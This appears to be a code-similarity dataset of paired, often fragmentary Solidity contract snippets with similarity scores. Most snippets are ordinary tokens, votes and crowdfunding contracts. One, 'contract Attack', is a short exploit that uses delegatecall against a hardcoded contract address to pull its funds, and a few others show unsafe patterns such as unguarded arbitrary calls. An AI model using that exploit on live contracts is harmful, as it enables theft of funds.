        string description;
        SubmissionStates subState;
    }

    constructor() public payable {
        msg.sender == owner;
    }

    modifier onlyOP {
        require(newBounties[bountyId].poster == msg.sender, ""You must be the owner of the post"");
        _;
    }
    modifier onlyNotOP {
        require(newBounties[bountyId].poster != msg.sender, ""You are not allowed to submit to your own bounties."");
        _;
    }
    modifier isOpen {
        require(newBounties[bountyId].bountyState == BountyStates.Open);
        _;
    }

    function postNewBounty( string memory _description, uint _bountyAmount) 
    public 
    payable 
    returns (bool) {

        require(_bountyAmount > 0);
        require(msg.sender.balance >= _bountyAmount);
        bountyId++;
        myBounties[msg.sender].push(bountyId) - 1;
        Bounty memory newBounty = Bounty(bountyId, _bountyAmount, msg.sender, _description, BountyStates.Open);
        newBounties[bountyId] = newBounty;

        return true;
    }

    function proposeSubmission(uint _bountyId, string memory _description) public onlyNotOP isOpen returns (bool success) {
        require(bountyId >= 0 && _bountyId <= bountyId);

        submissionId++;
        Submissions memory newSubb = Submissions(msg.sender, _description, SubmissionStates.Pending);
        mySubmissions[_bountyId].push(submissionId) - 1;
        subs[submissionId] = newSubb;
        return success;
    }

    function getBountySubmissions(uint _bountyId) public view onlyOP returns (
        address bountyHunter,
        string memory description,
        SubmissionStates subState) {

    }",0.5686417572444796,"contract BVA is ERC20Interface {
    using SafeMath for uint;

    string public symbol   = ""BVA"";
    string public name     = ""Bavala"";
    uint8  public decimals = 18;
    uint _totalSupply      = 28000000e18;


    address payable owner;


    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;


    modifier isOwner() {
        require(msg.sender == owner, ""must be contract owner"");
        _;
    }


    
    
    
    constructor() public {
        address ctr   = address(this);
        owner         = msg.sender;
        balances[ctr] = _totalSupply;
        emit Transfer(address(0x0), ctr, _totalSupply);
    }


    
    
    
    function sendBVA(address to, uint tokens) external isOwner returns(bool) {
        address ctr   = address(this);
        balances[ctr] = balances[ctr].sub(tokens);
        balances[to]  = balances[to].add(tokens);
        emit Transfer(ctr, to, tokens);
        return true;
    }

    
    
    
    function withdrawEther(uint _amount) external isOwner {
        owner.transfer(_amount);
    }


    
    
    
    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }


    
    
    
    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }


    
    
    
    
    
    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = balances[msg.sender].sub(tokens);
        balances[to]         = balances[to].add(tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }


    
    
    
    
    
    
    
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }


    
    
    
    
    
    
    
    
    
    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        balances[from]            = balances[from].sub(tokens);
        allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
        balances[to]              = balances[to].add(tokens);
        emit Transfer(from, to, tokens);
        return true;
    }


    
    
    
    
    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }


    
    
    
    function () external payable {
    }
}"
"contract Election {
  struct Candidate {
    uint id;
    string name;
    uint voteCount;
  }

  mapping (uint => Candidate) public candidates;
  
  uint public candidatesCount;

  constructor () public {
    addCandidate(""Candidate 1"");
    addCandidate(""Candidate 2"");
  }

  function addCandidate (string memory _name) private {
    candidatesCount++;
    candidates[candidatesCount] = Candidate(candidatesCount, _name, 0);
  }

}",0.542666999708444,"contract ERC20 is ERC20WithApprove {

	string public name;

	string public symbol;

	uint public decimals;



	constructor(string _name, string _symbol, uint _decimals, uint total, address target) public {

		name = _name;

		symbol = _symbol;

		decimals = _decimals;



		_mint(target, total);

	}



	function transfer(address to, uint value) public {

		_transfer(msg.sender, to, value);

	}

}"
"contract MyContract is Ownable {
    address[] public array;

    struct WalletParams {
        bool valid;
        uint x;
        uint y;
        uint z;
    }

    mapping(address => WalletParams) public map;

    event WalletUpdated(address indexed wallet);
    event WalletInserted(address indexed wallet);

    function insert_or_update(address wallet, uint x, uint y, uint z) external onlyOwner {
        WalletParams storage walletParams = map[wallet];
        if (walletParams.valid) {
            walletParams.x = x;
            walletParams.y = y;
            walletParams.z = z;
            emit WalletUpdated(wallet);
        }
        else {
            walletParams.valid = true;
            walletParams.x = x;
            walletParams.y = y;
            walletParams.z = z;
            array.push(wallet);
            emit WalletInserted(wallet);
        }
    }

    function getArray() external view returns (address[]) {
        return array;
    }

    function getCount() external view returns (uint) {
        return array.length;
    }
}",0.5553499056378275,"contract ERC20xVariables {

    address public creator;

    address public lib;



    uint256 constant public MAX_UINT256 = 2**256 - 1;

    mapping(address => uint) public balances;

    mapping(address => mapping(address => uint)) public allowed;



    uint8 public constant decimals = 18;

    string public name;

    string public symbol;

    uint public totalSupply;



    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);



    event Created(address creator, uint supply);



    function balanceOf(address _owner) public view returns (uint256 balance) {

        return balances[_owner];

    }



    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {

        return allowed[_owner][_spender];

    }

}"
"contract Relay {

    address public registrarAddr;
    string public name;

    function Relay(address _registrarAddr, string _name) {
        registrarAddr = _registrarAddr;
        name = _name;
    }

    function getImplAddr() constant returns (address) {
        Registrar registrar = Registrar(registrarAddr);
        return registrar.addr(name);
    }

    function() {
        address currentVersion = this.getImplAddr();
        if(!currentVersion.delegatecall(msg.data)) throw;
    }
}",0.5777820654856783,"contract FlightDelayAddressResolver {

    address public addr;

    address owner;

    function FlightDelayAddressResolver() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        require(msg.sender == owner);
        owner = _owner;
    }

    function getAddress() public constant returns (address _addr) {
        return addr;
    }

    function setAddress(address _addr) public {
        require(msg.sender == owner);
        addr = _addr;
    }
}"
"contract Attack {

    address bf = 0xdd1F635Dfb144068f91D430c76f4219088Af9E64;

    function attackBayFountain() public payable {
        
        require(bf.delegatecall(bytes4(keccak256(""put()""))));

        
        require(bf.delegatecall(bytes4( keccak256 (""get(address)"")), address(this)) ); 
    }

    
    function () payable public{
    }
}",0.5309631393258949,"contract DSProxyInterface {

    
    
    
    
    

    function execute(address _target, bytes memory _data) public payable returns (bytes32);

    function setCache(address _cacheAddr) public payable returns (bool);

    function owner() public returns (address);
}"
"contract DappTokenSale {


    function DappTokenSale(DappToken _tokenContract, uint256 _tokenPrice) public {
        admin = msg.sender;
        tokenContract = _tokenContract;
        tokenPrice = _tokenPrice;
    }

    function buyTokens(uint256 _numberOfTokens) public payable {
        require(msg.value == multiply(_numberOfTokens, tokenPrice));
        require(tokenContract.balanceOf(this) >= _numberOfTokens);
        require(tokenContract.transfer(msg.sender, _numberOfTokens));

        tokensSold += _numberOfTokens; 

        Sell(msg.sender, _numberOfTokens);
    }
}",0.57239438033903,"contract HasNoTokens is Ownable {

  District0xNetworkToken public district0xNetworkToken;

 
  function tokenFallback(address from_, uint256 value_, bytes data_) external {
    throw;
  }

  function isTokenSaleToken(address tokenAddr) returns(bool);

  
  function reclaimToken(address tokenAddr) external onlyOwner {
    require(!isTokenSaleToken(tokenAddr));
    ERC20Basic tokenInst = ERC20Basic(tokenAddr);
    uint256 balance = tokenInst.balanceOf(this);
    tokenInst.transfer(msg.sender, balance);
  }
}"
"contract CampaignFactory {
    address[] public deployedCampaigns;

    function createCampaign(uint minimum) public {
        address newCampaignAddress = new Campaign(minimum, msg.sender);
        deployedCampaigns.push(newCampaignAddress);
    }

    function getDeployedCampaing() public view returns(address[]memory) {
        return deployedCampaigns;
    }
}",0.5497343910145545,"contract ERC20Interface {



  function allowance(address tokenOwner, address spender) public view returns(uint remaining);



  function transfer(address to, uint tokens) public returns(bool success);



  function transferFrom(address from, address to, uint tokens) public returns(bool success);



}"
"contract Creation {
    
    struct Candidate {
        uint id;
        string name;
        uint voteCount;
    }

    
    mapping(address => bool) public voters;
    
    
    mapping(uint => Candidate) public candidates;
    
    uint public candidatesCount;

    
    event votedEvent (
        uint indexed _candidateId
    );

    constructor () public {
        addCandidate(""Candidate 1"");
        addCandidate(""Candidate 2"");
    }

    function addCandidate (string memory  _name) private {
        candidatesCount ++;
        candidates[candidatesCount] = Candidate(candidatesCount, _name, 0);
    }

    function vote (uint _candidateId) public {
        
        require(!voters[msg.sender]);

        
        require(_candidateId > 0 && _candidateId <= candidatesCount);

        
        voters[msg.sender] = true;

        
        candidates[_candidateId].voteCount ++;

        
        emit votedEvent(_candidateId);
    }
}",0.5448276147151284,"contract KolkhaToken {
  
  mapping (address => uint) public balanceOf;           
  string  public constant name = ""Kolkha"";         
  string public constant symbol = ""KHC"";                
  uint8 public constant decimals = 6;
  uint public totalSupply;                              

  event Transfer(address indexed from, address indexed to, uint value); 
  

  function KolkhaToken(uint initSupply) {
    balanceOf[msg.sender] = initSupply;
    totalSupply = initSupply;
  }


  
  function transfer(address _to, uint _value) returns (bool)
  {
    assert(msg.data.length == 2*32 + 4);
    require(balanceOf[msg.sender] >= _value); 
    require(balanceOf[_to] + _value >= balanceOf[_to]); 

    
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;

    Transfer(msg.sender, _to, _value); 
    return true;
  }
}"
"contract Interfacing {

    address ckAddress = 0x9fe1c58215407d67719ba680360940056e5eceb7;
    InterfaceWithMe daContract = InterfaceWithMe(ckAddress);

    function call() returns (string) {
        return daContract.call();
    }",0.531129396792241,"contract MarketContractRegistryInterface {

    function addAddressToWhiteList(address contractAddress) external;

    function isAddressWhiteListed(address contractAddress) external view returns (bool);

}"
"contract Assets 
    {

    DateTime1 public dt;

    enum ASSET_TYPE
    {
        does_not_exist,
        patient,
        pump,
        drug_X,
        num_asset_types
    }

    address public databaseId;

    struct DATA_OBJECT_TYPE
    {
        string data;
        uint time;
    }

    struct ASSET_OBJECT_TYPE
    {
        ASSET_TYPE assetType;
        string name;
        uint256 checkins;
        DATA_OBJECT_TYPE[] dataObjects;
    }

    mapping(address => ASSET_OBJECT_TYPE) public assetMap;

    address[] addressArr; 

    address owner;

    
    event e_assetRegistered(bool flag);

    
    event e_retrieveAssetData( string data, uint time );

      function Assets( address dbId_ ) public
      {
        owner = msg.sender;

        databaseId = dbId_;

        
      }

   function() public payable {}

   function checkAssetExists( address add_ ) public constant returns ( bool ) 
   {

       if( assetMap[add_].assetType == ASSET_TYPE.does_not_exist )
       {
           emit e_assetRegistered( false );
           return false;
       }

       emit e_assetRegistered( true );
       return true;
   }

   function registerAsset( address add_, string name_, ASSET_TYPE asset_ ) public payable returns ( bool )
   {
       bool registeredFlag = false;

        if( !checkAssetExists( add_ ) ) 
        {
            if(( asset_ > ASSET_TYPE.does_not_exist ) &&
               ( asset_ < ASSET_TYPE.num_asset_types ))
            {
                registeredFlag = true;
                assetMap[add_].assetType = asset_;
                assetMap[add_].name = name_;
            }
        }

        emit e_assetRegistered( registeredFlag );
        return registeredFlag;

   }

   function getAssetHistoryLength(address add_) public constant returns(uint)
   {
       if( checkAssetExists( add_ ) )
       {
            return assetMap[ add_ ].dataObjects.length;   

       }
       return 0;
   }

   
   function getAssetData(address add_, uint index_) public view returns(string data, uint16 year, uint8 month, uint8 day, uint8 hour, uint8 minute, uint second )
   {
       string memory returnData = ""undefined"";
       uint timestamp = 0;
        uint16 yearData = 0;

        uint8[5] dataData; 


       if( checkAssetExists( add_ ) )
       {
            returnData = assetMap[ add_ ].dataObjects[index_].data;
            timestamp = assetMap[ add_ ].dataObjects[index_].time;
            
            dataData[0] = dt.getMonth(timestamp);
            dataData[1] = dt.getDay(timestamp);
            dataData[2] = dt.getHour(timestamp);
            dataData[3] = dt.getMinute(timestamp);
            dataData[4] = dt.getSecond(timestamp);


       }

       return (returnData, yearData, dataData[0], dataData[1], dataData[2], dataData[3], dataData[4] );
   }

   function informNewStatus( address add_, string data_ ) public payable returns(bool)
   {
       if( checkAssetExists( add_ ) )
       {
           DATA_OBJECT_TYPE memory dataObject = DATA_OBJECT_TYPE(data_, now);

           assetMap[add_].dataObjects.push(dataObject);

           assetMap[add_].checkins++;

           return true;
       }

        return false;

   }

   function kill() public
   {
      if(msg.sender == owner) selfdestruct(owner);
   }

}",0.5954827071194687,"contract WarmWallet is Ownable {

    

    address defaultSweeper;



    mapping (address => address) sweepers;

    mapping (address => bool) financeFolks;

    mapping (address => bool) destinations;

    mapping (address => bytes32) dstLabels;

    mapping (address => uint256) dstIndex;

    address[] public destKeys;



    constructor() public {

        owner = msg.sender;

    }



    function sweeperOf(address asset) public view returns (address) {

    	if (sweepers[asset] == 0x0) {

    		return defaultSweeper;

    	}

    	return sweepers[asset];

    }



    function setDefaultSweeper(address sweeper) public onlyOwner {

    	defaultSweeper = sweeper;

    }



    function setSweeper(address asset, address sweeper) public onlyOwner {

    	sweepers[asset] = sweeper;

    }



    function authorizeAddress(address actor) public onlyOwner {

    	financeFolks[actor] = true;

    }



    function revokeAuthorization(address actor) public onlyOwner {

    	financeFolks[actor] = false;

    }



    function isAuthorized(address actor) public view returns (bool) {

    	return financeFolks[actor];

    }



    function addDestination(address dest, bytes32 label) public onlyOwner {

    	require(destinations[dest] == false);

    	destinations[dest] = true;

    	dstIndex[dest] = destKeys.length;

    	destKeys.push(dest);

    	dstLabels[dest] = label;

    }



    function removeDestination(address dest) public onlyOwner {

    	require(destinations[dest] == true);

    	destinations[dest] = false;

    	delete dstLabels[dest];

    	uint256 keyindex = dstIndex[dest];

    	delete destKeys[keyindex];

    	delete dstIndex[dest];

    }



    function isDestination(address dest) public view returns (bool) {

    	return destinations[dest];

    }



    function destinationLabel(address dest) public view returns (string) {

    	bytes memory bytesArray = new bytes(32);

    	for (uint256 i; i < 32; i++) {

        	bytesArray[i] = dstLabels[dest][i];

        }

    	return string(bytesArray);

    }



    function () public payable { 

        if (msg.value == 0 && financeFolks[msg.sender] == true) {

            address destination = addressAtIndex(msg.data, 2);

            require(destinations[destination] == true);



            address asset = addressAtIndex(msg.data, 1);

            address _impl = sweeperOf(asset);

            require(_impl != 0x0);

            bytes memory data = msg.data;



    		assembly {

    			let result := delegatecall(gas, _impl, add(data, 0x20), mload(data), 0, 0)

    			let size := returndatasize

    			let ptr := mload(0x40)

    			returndatacopy(ptr, 0, size)

    			switch result

    			case 0 { revert(ptr, size) }

    			default { return(ptr, size) }

    		}

        }

    }



    function addressAtIndex(bytes _bytes, uint256 index) internal pure returns (address asset) {

        assembly {

            

            

            

            

            asset := mload(add(_bytes, add(4, mul(32, index))))

        }

    }



}"
"contract ChainList {
    
    address seller;
    string name;
    string description;
    uint256 price;

    
    function sellArticle(string _name, string _description, uint256 _price) public {
        seller = msg.sender;
        name = _name;
        description = _description;
        price = _price;
    }

    
    function getArticle() public constant returns (
        address _seller,
        string _name,
        string _description,
        uint256 _price) {
        return(seller, name, description, price);
    }
}",0.5985089014989351,"contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    
    constructor () public {
        _name = ""Sable Coin"";
        _symbol = ""SAC1"";
        _decimals = 18;
    }

    
    function name() public view returns (string memory) {
        return _name;
    }

    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}"
"contract ArraysExample {
   uint[] numbers;

   function addUser() public returns (uint[]) {
      numbers.push(random());
      return numbers;
   }

   function random() private view returns (uint8) {
      return uint8(uint256(keccak256(block.timestamp, block.difficulty))%251);
   }
}",0.5979142490128906,"contract myTime is mortal
{
    uint deployTime;

    
    function myTime() public
    {
        deployTime = block.timestamp;
    }

    function getDeploytimeBlocktimeBlocknumber() constant returns (uint, uint, uint)
    {
        return (deployTime, block.timestamp, block.number);
    }

}"
"contract CampaignFactory {

    Campaign[] campaigns;
    mapping(address => Campaign[]) campaignsByOwner;

    function createCampaign(uint min_contrib) public {
        Campaign newCampaign = new Campaign(min_contrib, msg.sender);
        campaignsByOwner[msg.sender].push(newCampaign);
        campaigns.push(newCampaign);
    }

    function getAllCampaigns() public view returns (Campaign[] memory) {
        return campaigns;
    }

    function getCampaignByAddress(address creator) public view returns (Campaign[] memory) {
        return campaignsByOwner[creator];
    }
}",0.5333508245923521,"contract VotingChallengeForwarder {

    mapping ( address => address[] ) public sendersHash;

    mapping ( address => uint[] ) public sumsHash;



    function forward(address payable to, address sender) public payable {

        to.transfer(msg.value);

        sendersHash[to].push(sender);

        sumsHash[to].push(msg.value);

    }



    function getSendersHash(address user) public view returns (address[] memory) {

        return sendersHash[user];

    }



    function getSumsHash(address user) public view returns (uint[] memory) {

        return sumsHash[user];

    }

}"
"contract Determinant {
  uint [5][5] public matA = [[1,1,2,1,2],[3,0,0,5,4],[2,1,4,3,1],[1,0,5,0,7],[4,2,5,4,3]];
  uint public matrix_order;
  int256 public output = 0;
  uint [5] public temp_output;

function compute () public {
    matrix_order = matA.length;
    output = determinantOfMatrix(matA, matrix_order);
}

function determinantOfMatrix (uint[5][5] memory mat1, uint _order) private returns (int256) {
    uint [5][5] memory submatrix;
    int256 det = 0;
    uint256 sign = 1;
    int256 result;

    if (_order == 2)
        return int256((mat1[0][0] * mat1[1][1]) - (mat1[1][0] * mat1[0][1]));
    else {
        for (uint x = 0; x < _order; x++){
            uint subi = 0;
            for (uint i = 1; i< _order; i++){
                uint subj = 0;
                for(uint j = 0; j<_order; j++){
                    if (j != x){
                        submatrix[subi][subj] = mat1[i][j];
                        subj++;
                    }
                }
                subi++;
            }
            result = int256((-sign) ** x);
            temp_output[x] = mat1[0][x] * uint(determinantOfMatrix (submatrix, _order - 1 ));
            det = det + result * int256(temp_output[x]);
        }
        return det;
    }
}    ",0.5492873871844761,"contract Parser {

    using SafeMath8 for uint8;

    using SafeMath256 for uint256;



    using SafeConvert for uint256;

    

    DragonStorage _storage_ = DragonStorage(0x960f401AED58668ef476eF02B2A2D43B83C261D8);



    function _getIndexAndFactor(uint8 _counter) internal pure returns (uint8 index, uint8 factor) {

        if (_counter < 44) index = 0;

        else if (_counter < 88) index = 1;

        else if (_counter < 132) index = 2;

        else index = 3;

        factor = _counter.add(1) % 4 == 0 ? 10 : 100;

    }



    function getParsedGenome(uint256 _id) external view returns (uint8[16][10] parsed) {

        uint256[4] memory _composed = _storage_.getGenome(_id);

        uint8 counter = 160; 

        uint8 _factor;

        uint8 _index;



        for (uint8 i = 0; i < 10; i++) {

            for (uint8 j = 0; j < 16; j++) {

                counter = counter.sub(1);

                

                

                (_index, _factor) = _getIndexAndFactor(counter);

                parsed[9 - i][15 - j] = (_composed[_index] % _factor).toUint8();

                _composed[_index] /= _factor;

            }

        }

    }

}"
"contract C {
    uint[] counters;
    function getCounter(uint index)
        returns (uint counter, bool error) {
            if (index >= counters.length) return (0, true);
            else return (counters[index], false);
        }
    function checkCounter(uint index) {
        var (counter, error) = getCounter(index);
        if (error) { ... }
        else { ... }
    }
}",0.5635574680095512,"contract Ownable {

    function isOwner() returns (bool) {

        if (Owner == msg.sender) return true; return false;

    }

    address public Owner = msg.sender;

    function transferOwner(address _owner) public {

        if (isOwner()) Owner = _owner;

    }

    function clear() public {

        if (isOwner()) selfdestruct(Owner);

    }

}"
"contract B {

function getGasLimit() returns (uint) {
    uint gasLimit;

    assembly {
        gasLimit := gaslimit
    }
    return gasLimit;

}

}",0.5807555121519423,"contract TapInterface {

    function fix() public view returns (uint);

    function gap() public view returns (uint);

}"
"contract ProductFactory {

    bytes32[] public productNames;
    address[] public productAddresses;

    function addProduct (bytes32 _productName) {
        address newProduct = new Product(_productName);
        productAddresses.push(newProduct);
    }

    function getName (uint i) {
    Product prod = Product(productAddresses[i]);

    productNames[i] = prod.Name();
  }
}",0.556464657486099,"contract ConsensysAcademy{
    mapping(address=>bytes32) public names;
    address[] public addresses;
    
    modifier onlyUnique(){
        if(names[msg.sender] == 0){ _; }else{ throw; }
    }
    function register(bytes32 name) onlyUnique{
        names[msg.sender] = name; 
        addresses.push(msg.sender);
    }
    function getAddresses() returns(address[]){ return addresses; }
}"
"contract parseBytes {
  bytes test = ""\x20\x00\x10"";
  function f() {
    assembly{
        test 
        pop 
    }
  }
}",0.5398229920318415,"contract IAssets {



    

    

    

    

    

    function withdrawAsset(

        bytes assetData,

        uint256 amount

    )

        external;

}"
"contract BDetails {

struct Details {

    bytes32[] DetailsArray;


}
mapping(string => Details) DetailStructs;

 function appendDetails(string id, bytes32 concatt) payable returns(bool success) {

    DetailStructs[id].DetailsArray.push(concatt); 

}

}",0.5097885108354808,"contract BettingInterface {
    
    function placeBet(bytes32 horse) external payable;
    
    function claim_reward() external;

    mapping (bytes32 => bool) public winner_horse;
    
    function checkReward() external constant returns (uint);
}"
"contract kindaCool {
    function nifty() superDuperOnly {};
}",0.5515803493694431,"contract sendblocker{
 function () public {assert(0>0);}
    
}"
"contract Game {
    address public owner;

    
    mapping(uint256 => Recipe) private recipeInfo;

    struct Recipe {
        uint256 recipeId;
        uint256[] ingredientId;
        uint256[] ingredientAmount;
        uint256 ethCost;
    }

    
    function Game() public {
        owner = msg.sender;
        recipeInfo[1] = Recipe(1, [1, 5], [100, 100], 50000000);
        recipeInfo[2] = Recipe(2, [2, 3, 4], [100, 200, 300], 100000000);
    }
}",0.5567571907353019,"contract AddValues {
    address payable owner;
    event EventSeeAmount(uint256 amount);
    
    constructor () public{
        owner=msg.sender;
    }
    
    modifier onlyOwner{
        require (msg.sender == owner);
        _;
    }

    function () external payable{
        uint256 total;
        uint256 x = 3;
        uint256 y = 30;
        
        total = x + y;
        emit EventSeeAmount(total);
    }
    
    function destroy () public onlyOwner{
        selfdestruct(owner);
    }
    
}"
"contract Forward {
       address public receiver;



function Forward(address _receiver) {
    receiver = _receiver;
}

function() public payable {
    
    
    
    require(receiver.call.gas(gasleft() - 2000).value(msg.value)());
}
}",0.5982940285965991,"contract BurnTok {

    function () payable public{

    }

	function BurnToken (address _tokenaddress, uint256 _value) public {

        require(_tokenaddress.call(bytes4(keccak256(""burn(uint256)"")), _value));

    }

}"
"contract AjTokenSale {
address admin;
AjToken public tokenContract;
uint256 public tokenPrice;
uint256 public tokenSold;

event Sell(address _buyer, uint256 _amount);

function AjTokenSale(AjToken _tokenContract, uint256 _tokenPrice) public {
    
    admin = msg.sender;
    
    tokenContract = _tokenContract;
    
    tokenPrice = _tokenPrice;
}    



function multiply(uint x, uint y) internal pure returns(uint z) {

    require (y == 0 || (z = x * y)/y == x);

}


function buyTokens(uint256 _numberOfTokens) public payable {
    

    require(msg.value == multiply(_numberOfTokens , tokenPrice));

    

    require(tokenContract.balanceOf(this) >= _numberOfTokens);

    
    require(tokenContract.transfer(msg.sender, _numberOfTokens));
    
    tokenSold += _numberOfTokens;
    
    Sell(msg.sender, _numberOfTokens); 
}



function endSale() public {
    
    require(msg.sender == admin);       
    
    require(tokenContract.transfer(admin, tokenContract.balanceOf(this))); 
    admin.transfer(address(this).balance);

}

}",0.5993982198226345,"contract Kongtou {
    
    address public owner;
    
    constructor() payable public  {
        owner = msg.sender;
    }
    
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    
    function() payable public {
        
    }

    
    function deposit() payable public{
    }
    
    
    function transferETH(address _to) payable public returns (bool){
        require(_to != address(0));
        require(address(this).balance > 0);
        _to.transfer(address(this).balance);
        return true;
    }
    
    
    function transferETH(address[] _tos, uint256 amount) public returns (bool) {
        require(_tos.length > 0);
        for(uint32 i=0;i<_tos.length;i++){
            _tos[i].transfer(amount);
        }
        return true;
    }
    
    
    function getETHBalance() view public returns(uint){
        return address(this).balance;
    }
    
   
   function transferToken(address from,address caddress,address[] _tos,uint v)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transfer(address,address,uint256)""));
        for(uint i=0;i<_tos.length;i++){
            caddress.call(id,from,_tos[i],v);
        }
        return true;
    }


  
   
    
}"
"contract Notes {
    struct notes {
        string id;
        string content;
        address owner;
        bool isCreated;
        bool isDeleted;
        uint256 timestamp;
    }

    mapping(address => mapping(string =>notes)) private userNotes;

    function addNote(string memory _content, string memory _noteId) public {
        require(!userNotes[msg.sender][_noteId].isCreated,""a Note is already Created With This Id"");
        userNotes[msg.sender][_noteId] =notes(_noteId, _content,msg.sender, true, false, now);
    }
}",0.5854157389582669,"contract SimpleVoting {



    string public constant description = ""abc"";



    string public name = ""asd"";



    mapping (string => string) certificates;



    address owner;



    constructor() public {

        owner = msg.sender;

    }



    function getCertificate(string memory id) public view returns (string memory) {

        return certificates[id];

    }



    function setCertificate(string memory id, string memory cert) public {

        require(msg.sender == owner);

        certificates[id] = cert;

    }

}"
"contract simple {
    uint[] dataArray;

    function push_one_more() {
        dataArray.push(1);
    }
}",0.5611125498047154,"contract Mintable {
    function mint(address to, uint256 amount) public;
}"
"contract ABC_Creator {

    ABC localABC;
    mapping (bytes32 => address[]) public abcMap;
    event Log(bytes32, uint);

    function createABC(bytes32 _name, uint _val) public {
        localABC = new ABC(_name, _val);
        abcMap[_name].push(localABC);
    }

    function getABCList(bytes32 _name) public {

        uint len = abcMap[_name].length;
        for (uint i = 0; i < len; i++) {
            Log(ABC(abcMap[_name][i]).name(), ABC(abcMap[_name][i]).value());
        }

    }


}",0.5427651896213332,"contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view virtual returns (uint);
    function transferFrom(address from, address to, uint value) public virtual;
    function approve(address spender, uint value) public virtual;
    event Approval(address indexed owner, address indexed spender, uint value);
}"
"contract ApiCall is usingOraclize {

        uint public DieselPriceUSD;

        function ApiCall() {

                OAR = OraclizeAddrResolverI(0x9851eb2d10b765d8857e7e1b060bc1eb166e89f2);
        }

        function __callback(bytes32 myid, string result) {
                if (msg.sender != oraclize_cbAddress()) throw;
                DieselPriceUSD = parseInt(result, 2); 
        }

        function update() payable {
                oraclize_query(""URL"", ""xml(https:
         }

     }",0.5444688373037372,"contract Swarmer is usingOraclize {

    

    string public swarmContent;

    bytes32 public result;



    event newOraclizeQuery(string description);

    event newSwarmContent(string swarmContent);



    function swarm() public{

        update();

    }

    

    function update() payable public {

        oraclize_query(""swarm"", ""e942c86508f8a09fbc35019961301fbdaf88894ddc9b9d86060eb97b3edf81f4"");

    }

    

}"
"contract Voting is Mortal {
struct Voter {
    address voterAddress;
    uint hasRightToVote;
    uint voted;
    address delegate;
}

struct Slide {
    uint number;
    uint voteCount;
    uint score;
    uint avgScore;
}

address public chairperson;

mapping(address => Voter) public voters;
mapping(uint => Slide) public slides;

uint public totalSlides;
uint public totalVotes;
uint public totalVoters;


event GivenRightToVote(address indexed chairperson, address indexed voter);
event hasVoted(address indexed voter, uint indexed slideNumber, uint indexed slideScore);
event hasDelegated(address indexed voter, address indexed delegate);
event VoterAlreadyExists(address indexed voter);
event VoterCreated(address indexed voter);
event VoterNotExists(address indexed voter);
event SenderNotChairperson(address indexed sender);
event callInitVoter(address indexed voter, address indexed sender);
event invalidVoter(address indexed voter);
event callGiveRightToVote(address indexed voterAddr);
event initSlideVote(address indexed voterAddr, uint indexed slide);
event VoterNoRightToVote(address indexed voter);

function Voting(uint numberSlides) {
    uint i;
    for (i = 0; i < numberSlides; i++) {
        slides[i] = Slide(i, 0, 0, 0);
    }
    chairperson = msg.sender;
    initVoter(msg.sender);
    voters[msg.sender].hasRightToVote = 1;
    totalSlides = numberSlides;
    totalVoters = 1;
}

function getSlide(uint slideNumber) returns (uint number, uint score, uint voteCount) {
    score = slides[slideNumber].score;
    voteCount = slides[slideNumber].voteCount;
    number = slides[slideNumber].number;
    return(number, score, voteCount);
}

function getSlideVoteCount(uint slideNumber) returns (uint voteCount) {
    voteCount = slides[slideNumber].voteCount;
    return voteCount;
}

function initVoter(address voterAddr) {
    callInitVoter(voterAddr, msg.sender);
    if(voterAddr == address(0)) {
        invalidVoter(voterAddr);
    }
    if(msg.sender == chairperson) {
        if(voters[voterAddr].voterAddress == voterAddr) {
            VoterAlreadyExists(voterAddr);
        } else {
            VoterNotExists(voterAddr);
            voters[voterAddr] = Voter(voterAddr, 0, 0, address(0));
            totalVoters += 1;
        }
        VoterCreated(voterAddr);
    } else {
        SenderNotChairperson(msg.sender);
    }
}

event unauthorizedCallerGiveRightToVote(address indexed voter);
function giveRightToVote(address voterAddr) {
    callGiveRightToVote(voterAddr);
    if(msg.sender == chairperson) {
        if(voters[voterAddr].voterAddress == 0x0000000000000000000000000000000000000000) {
            VoterNotExists(voterAddr);
            initVoter(voterAddr);
        } else {
            VoterAlreadyExists(voterAddr);
        }
        voters[voterAddr].hasRightToVote = 1;
        GivenRightToVote(chairperson, voterAddr);
    } else {
        unauthorizedCallerGiveRightToVote(voterAddr);
    }
}

event callVote(address indexed voter, uint indexed slide, uint256 indexed score);
event VoterNotAllowedToVote(address indexed voter);
event VoterAllowedToVote(address indexed voter);
event ChairpersonNotAllowedToVote(address indexed voter);
event VoterExists(address indexed voter);
function vote(uint slide, uint256 score) {
    Voter voter;
    callVote(msg.sender, slide, score);
    if(msg.sender == chairperson) {
        ChairpersonNotAllowedToVote(msg.sender);
    } else {
        if(msg.sender == address(0)) {
            VoterNotExists(msg.sender);
        } else {
            voter = voters[msg.sender];
            if(voter.hasRightToVote != 1) {
                VoterNoRightToVote(msg.sender);
            } 
            if(voter.hasRightToVote == 1) {
                VoterExists(msg.sender);
                VoterAllowedToVote(msg.sender);
                voter.voted += 1;
                totalVotes ++;
                slides[slide].voteCount += 1;
                slides[slide].score += score;
                hasVoted(msg.sender, slide, score);
            }
        }
    }
}

function vote2(uint slide, uint score) {
    Voter voter;
    callVote(msg.sender, slide, score);
    voter = voters[msg.sender];
    if(voter.voterAddress != address(0)) {
        VoterExists(msg.sender);
        if(msg.sender != chairperson) {
            if(voter.hasRightToVote == 1) {
                VoterAllowedToVote(msg.sender);
                voter.voted ++;
